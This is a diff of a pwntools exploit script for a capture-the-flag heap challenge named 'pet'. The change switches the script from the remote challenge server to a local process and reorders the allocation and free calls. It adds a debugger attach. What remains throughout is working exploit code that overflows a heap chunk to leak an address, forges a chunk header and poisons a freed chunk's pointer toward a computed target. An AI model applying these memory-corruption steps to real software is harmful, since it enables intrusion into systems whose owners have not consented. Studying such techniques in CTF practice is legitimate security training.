@@ -3,8 +3,8 @@ from pwn import *
 from LibcSearcher import * 
 # context.log_level = 'debug' 
 
-# p=process('./pet-copy')
-p=remote('t.ctf.qwq.cc',49637)
+p=process('./pet')
+# p=remote('t.ctf.qwq.cc',49637)
 # elf=ELF('./pet')
 libc=ELF('./libc.so.6')
 # libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')
@@ -33,18 +33,10 @@ def comment(comment):
     p.sendline(b'5')
     p.recvuntil(b'comment ^-^\n')
     p.sendline(comment)
-# p.interactive()
-# pause()
-add()
-
-# comment(p64(0)*2+p8(0))
 add()
 add()
-# free(0)
-# gdb.attach(p)
+add()
 free(1)
-
-# gdb.attach(p)
 edit(0,b'a'*0x40)
 show(0)
 p.recvuntil(b'a'*0x40)
@@ -54,6 +46,7 @@ edit(0,p64(0)*6+p64(0x61)+p64(0))
 add()
 free(2)
 free(1)
+gdb.attach(p)
 edit(0,p64(0)*6+p64(0x61)+p64(getaddr+0x7a0))
 # gdb.attach(p)
 
